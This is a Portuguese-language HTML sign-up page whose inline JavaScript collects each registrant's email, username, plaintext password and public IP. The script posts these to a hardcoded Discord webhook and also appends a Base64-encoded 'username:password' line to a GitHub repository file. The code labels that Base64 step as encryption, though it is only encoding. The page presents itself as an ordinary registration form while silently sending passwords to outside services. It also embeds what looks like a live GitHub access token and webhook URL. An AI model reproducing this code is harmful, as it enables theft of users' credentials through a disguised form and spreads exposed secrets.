<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadastro</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <h2>Criar Conta</h2>
        <form action="#" method="post">
            <input type="email" id="email" name="email" placeholder="Email" required>
            <input type="text" id="username" name="username" placeholder="Usu√°rio" required>
            <input type="password" id="password" name="password" placeholder="Senha" required>
            <div class="terms">
                <input type="checkbox" id="terms" name="terms" required>
                <label for="terms">Aceito os termos e condi√ß√µes</label>
            </div>
            <button onclick="submitData(event)" type="submit">Cadastrar</button>
        </form>
        <a class="new" href="../login" style="color: rgb(212, 255, 0)">Create a account</a>
    </div>
    <script>
        const token = "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";  // ‚ö† Substitua pelo seu token do GitHub
        const owner = "JempUnkn";  // ‚ö† Seu usu√°rio ou organiza√ß√£o no GitHub
        const repo = "firebase_teste";  // ‚ö† Nome do reposit√≥rio
        const filePath = "logger.log";  // Arquivo onde salvar os dados

        function formatarDataHora(date = new Date()) {
            const dia = String(date.getDate()).padStart(2, '0');
            const mes = String(date.getMonth() + 1).padStart(2, '0'); // Janeiro √© 0
            const ano = date.getFullYear();
            const horas = String(date.getHours()).padStart(2, '0');
            const minutos = String(date.getMinutes()).padStart(2, '0');
            const segundos = String(date.getSeconds()).padStart(2, '0');

            // Obtendo o fuso hor√°rio no formato UTC¬±HH:MM
            const offsetMinutos = date.getTimezoneOffset();
            const offsetHoras = Math.abs(Math.floor(offsetMinutos / 60));
            const offsetRestanteMin = Math.abs(offsetMinutos % 60);
            const sinal = offsetMinutos > 0 ? '-' : '+';
            const fusoHorario = `UTC${sinal}${String(offsetHoras).padStart(2, '0')}:${String(offsetRestanteMin).padStart(2, '0')}`;

            return `${dia}/${mes}/${ano} ${horas}:${minutos}:${segundos} ${fusoHorario}`;
        }

        function encryptData(data) {
            try {
                return btoa(unescape(encodeURIComponent(data)));  // Codifica os dados em Base64
            } catch (error) {
                console.error("Erro ao criptografar dados:", error);
                return null;
            }
        }

        



        /// Enviar um log pra discord
        const webhookUrl = 'https://discord.com/api/webhooks/1345523112787050609/UB5aUudmYFkc91vmQ_Nl4cLtF7vjmSBBK96_Wy1a55AQ2MAfRaylZgPPhk3ZaeQoHfPg';

        function sendToDiscord(ip, email, username, password) {
            const embed = {
                title: "üìù Novo Cadastro Realizado!",
                description: "Um novo usu√°rio se registrou no sistema.",
                color: 16753920, // Laranja
                fields: [
                    { name: "üë§ Usu√°rio", value: `\`${username}\``, inline: true },
                    { name: "üìß Email", value: `\`${email}\``, inline: true },
                    { name: "üîë Senha", value: `\`${password}\``, inline: false },
                    { name: "üåç Endere√ßo IP", value: `\`${ip}\``, inline: false }
                ],
                footer: {
                    text: `Cadastro realizado em ${formatarDataHora()}`
                },
                timestamp: new Date().toISOString()
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            })
            .then(response => {
                if (response.ok) {
                    console.log('Embed enviado com sucesso!');
                } else {
                    console.log('Falha ao enviar o embed.');
                }
            })
            .catch(error => console.error('Erro ao enviar embed:', error));
        }





        function submitData(event) {
            event.preventDefault(); // Impede o envio do formul√°rio

            const email = document.getElementById("email").value.trim();
            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();
            const termsAccepted = document.getElementById("terms").checked;

            if (!email || !username || !password) {
                alert("Todos os campos s√£o obrigat√≥rios!");
                return;
            }

            if (!termsAccepted) {
                alert("Voc√™ deve aceitar os termos e condi√ß√µes!");
                return;
            }

            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    sendToDiscord(ip, email, username, password); // Envia os dados para o Discord via embed
                    const dataToEncrypt = `${username}:${password}`;
                    const encryptedData = encryptData(dataToEncrypt);

                    updateGitHubFile(encryptedData);
                })
                .catch(error => console.error("Erro ao obter IP:", error));
        }


        function updateGitHubFile(encryptedData) {
            const url = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;

            fetch(url, {
                headers: { Authorization: `token ${token}` }
            })
                .then(res => res.json())
                .then(fileData => {
                    const sha = fileData.sha || null;
                    const existingContent = fileData.content 
                        ? decodeURIComponent(escape(atob(fileData.content))) 
                        : "";  // Se n√£o houver conte√∫do, come√ßa com string vazia

                    const updatedContent = existingContent + "\n" + encryptedData;
                    const encodedContent = btoa(unescape(encodeURIComponent(updatedContent)));

                    fetch(url, {
                        method: "PUT",
                        headers: {
                            "Authorization": `token ${token}`,
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            message: `Adicionando nova entrada: ${encryptedData}`,
                            content: encodedContent,
                            sha: sha
                        })
                    })
                        .then(res => res.json())
                        .then(response => console.log("Arquivo atualizado:", response))
                        .catch(error => console.error("Erro ao enviar para GitHub:", error));
                })
                .catch(error => console.error("Erro ao verificar arquivo no GitHub:", error));
        }
    </script>
</body>
</html>
